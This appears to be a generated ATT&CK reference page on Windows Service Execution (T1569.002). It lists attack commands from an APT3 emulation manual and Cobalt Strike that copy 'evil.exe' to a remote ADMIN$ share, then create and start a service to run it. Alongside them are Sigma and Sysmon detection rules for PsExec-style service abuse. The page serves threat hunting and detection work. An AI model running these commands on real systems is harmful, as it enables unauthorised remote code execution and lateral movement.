
# Service Execution

## Description

### MITRE Description

> Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)

Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1569/002

## Potential Commands

```
Creating a new service remotely:
net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe
sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto  DisplayName= "DisplayName"
sc \\COMP start acachsrv
Creating a new service remotely:
shell net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
shell sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"
shell sc \\COMP start acachsrv
!=wininit
services.exe
*.exe
pcalua.exe
\SYSTEM\CurrentControlSet\services
\\Windows\\.+\\sc.exestart|create|query|config
\SYSTEM\CurrentControlSet\services\\Windows\\.+\\lsass.exe|\\Windows\\.+\\svchost.exe
powershell/lateral_movement/invoke_psexec
```

## Commands Dataset

```
[{'command': 'Creating a new service remotely:\n'
             'net use \\\\COMP\\ADMIN$ "password" /user:DOMAIN_NAME\\UserName\n'
             'copy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
             'sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto  DisplayName= '
             '"DisplayName"\n'
             'sc \\\\COMP start acachsrv',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Creating a new service remotely:\n'
             'shell net use \\\\COMP\\ADMIN$ "password" '
             '/user:DOMAIN_NAME\\UserName\n'
             'shell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\n'
             'shell sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto description= '
             '"Description here" DisplayName= "DisplayName"\n'
             'shell sc \\\\COMP start acachsrv',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': '!=wininit',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'services.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '*.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'pcalua.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '\\\\Windows\\\\.+\\\\sc.exestart|create|query|config',
  'name': None,
  'source': 'SysmonHunter - Service Execution'},
 {'command': '\\SYSTEM\\CurrentControlSet\\services',
  'name': None,
  'source': 'SysmonHunter - Service Execution'},
 {'command': '\\SYSTEM\\CurrentControlSet\\services\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe',
  'name': None,
  'source': 'SysmonHunter - Service Execution'},
 {'command': 'powershell/lateral_movement/invoke_psexec',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_psexec',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Omer Faruk Celik',
                  'date': '2018/03/20',
                  'description': 'Detects the use of smbexec.py tool by '
                                 'detecting a specific service installation',
                  'detection': {'condition': 'service_installation',
                                'service_installation': {'EventID': 7045,
                                                         'ServiceFileName': '*\\execute.bat',
                                                         'ServiceName': 'BTOBTO'}},
                  'falsepositives': ['Penetration Test', 'Unknown'],
                  'fields': ['ServiceName', 'ServiceFileName'],
                  'id': '52a85084-6989-40c3-8f32-091e12e13f09',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'system'},
                  'references': ['https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/'],
                  'tags': ['attack.lateral_movement',
                           'attack.execution',
                           'attack.t1077',
                           'attack.t1035'],
                  'title': 'smbexec.py Service Installation'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/03/13',
                  'description': 'Detects a PsExec service start',
                  'detection': {'condition': 'selection',
                                'selection': {'ProcessCommandLine': 'C:\\Windows\\PSEXESVC.exe'}},
                  'falsepositives': ['Administrative activity'],
                  'id': '3ede524d-21cc-472d-a3ce-d21b568d8db7',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2012/12/11',
                  'tags': ['attack.execution', 'attack.t1035', 'attack.s0029'],
                  'title': 'PsExec Service Start'}},
 {'data_source': {'author': 'Timur Zinniatullin, Daniil Yugoslavskiy, '
                            'oscd.community',
                  'date': '2019/10/21',
                  'description': 'Detects manual service execution (start) via '
                                 'system utilities',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': ' start ',
                                              'Image|endswith': ['\\net.exe',
                                                                 '\\net1.exe']}},
                  'falsepositives': ['Legitimate administrator or user '
                                     'executes a service for legitimate '
                                     'reason'],
                  'id': '2a072a96-a086-49fa-bcb5-15cc5a619093',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1035/T1035.yaml'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1035'],
                  'title': 'Service Execution'}},
 {'data_source': {'action': 'global',
                  'author': 'Thomas Patzke',
                  'description': 'Detects PsExec service installation and '
                                 'execution events (service and Sysmon)',
                  'detection': {'condition': '1 of them'},
                  'falsepositives': ['unknown'],
                  'fields': ['EventID',
                             'CommandLine',
                             'ParentCommandLine',
                             'ServiceName',
                             'ServiceFileName'],
                  'id': '42c575ea-e41e-41f1-b248-8093c3e82a28',
                  'level': 'low',
                  'references': ['https://www.jpcert.or.jp/english/pub/sr/ir_research.html',
                                 'https://jpcertcc.github.io/ToolAnalysisResultSheet'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1035', 'attack.s0029'],
                  'title': 'PsExec Tool Execution'}},
 {'data_source': {'detection': {'service_execution': {'EventID': 7036,
                                                      'ServiceName': 'PSEXESVC'},
                                'service_installation': {'EventID': 7045,
                                                         'ServiceFileName': '*\\PSEXESVC.exe',
                                                         'ServiceName': 'PSEXESVC'}},
                  'logsource': {'product': 'windows', 'service': 'system'}}},
 {'data_source': {'detection': {'sysmon_processcreation': {'Image': '*\\PSEXESVC.exe',
                                                           'User': 'NT '
                                                                   'AUTHORITY\\SYSTEM'}},
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'}}},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['7045', 'New Service']},
 {'data_source': ['7040', 'Service Change']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['7040/7045', 'New and changed Service']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Creating '
                                                                              'a '
                                                                              'new '
                                                                              'service '
                                                                              'remotely:\n'
                                                                              'net '
                                                                              'use '
                                                                              '\\\\COMP\\ADMIN$ '
                                                                              '"password" '
                                                                              '/user:DOMAIN_NAME\\UserName\n'
                                                                              'copy '
                                                                              'evil.exe '
                                                                              '\\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'create '
                                                                              'acachsrv '
                                                                              'binPath= '
                                                                              '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                              'start= '
                                                                              'auto  '
                                                                              'DisplayName= '
                                                                              '"DisplayName"\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'start '
                                                                              'acachsrv',
                                                  'Category': 'T1035',
                                                  'Cobalt Strike': 'Creating a '
                                                                   'new '
                                                                   'service '
                                                                   'remotely:\n'
                                                                   'shell net '
                                                                   'use '
                                                                   '\\\\COMP\\ADMIN$ '
                                                                   '"password" '
                                                                   '/user:DOMAIN_NAME\\UserName\n'
                                                                   'shell copy '
                                                                   'evil.exe '
                                                                   '\\\\COMP\\ADMIN$\\acachsrv.exe\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'create '
                                                                   'acachsrv '
                                                                   'binPath= '
                                                                   '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                   'start= '
                                                                   'auto '
                                                                   'description= '
                                                                   '"Description '
                                                                   'here" '
                                                                   'DisplayName= '
                                                                   '"DisplayName"\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'start '
                                                                   'acachsrv',
                                                  'Description': 'This '
                                                                 'technique '
                                                                 'creates a '
                                                                 'new service '
                                                                 'on the '
                                                                 'remote '
                                                                 'machine. '
                                                                 "It's "
                                                                 'important to '
                                                                 'note the '
                                                                 'spaces after '
                                                                 'the = in '
                                                                 'these '
                                                                 'commands! '
                                                                 'Also, before '
                                                                 'starting the '
                                                                 'service, run '
                                                                 'the '
                                                                 'following '
                                                                 'commands to '
                                                                 'make sure '
                                                                 'everything '
                                                                 'is set up '
                                                                 'properly:\n'
                                                                 'sc \\\\COMP '
                                                                 'qc acachsrv\n'
                                                                 'dir '
                                                                 '\\\\COMP\\ADMIN$\\acachsrv.exe',
                                                  'Metasploit': ''}},
 {'Threat Hunting Tables': {'chain_id': '100076',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1035',
                            'mitre_caption': 'service_execution',
                            'os': 'windows',
                            'parent_process': '!=wininit',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'services.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100124',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Sobnot.A',
                            'loaded_dll': '',
                            'mitre_attack': 'T1035',
                            'mitre_caption': 'service_execution',
                            'os': 'windows',
                            'parent_process': '*.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'pcalua.exe',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1035': {'description': None,
                           'level': 'medium',
                           'name': 'Service Execution',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'start|create|query|config'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\sc.exe'}},
                                      'type': 'process'},
                                     {'process': {'cmdline': {'pattern': '\\SYSTEM\\CurrentControlSet\\services'}},
                                      'type': 'process'},
                                     {'op': 'and',
                                      'process': {'image': {'flag': 'regex',
                                                            'op': 'not',
                                                            'pattern': '\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe'}},
                                      'reg': {'path': {'pattern': '\\SYSTEM\\CurrentControlSet\\services'}},
                                      'type': 'reg'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1035',
                                            'ATT&CK Technique #2': 'T1077',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_psexec":  '
                                                                                 '["T1035","T1077"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_psexec',
                                            'Technique': 'Service '
                                                         'Execution\xa0'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations


* [Restrict File and Directory Permissions](../mitigations/Restrict-File-and-Directory-Permissions.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    

# Actors


* [Honeybee](../actors/Honeybee.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [APT32](../actors/APT32.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Silence](../actors/Silence.md)
    
* [APT41](../actors/APT41.md)
    
* [APT39](../actors/APT39.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
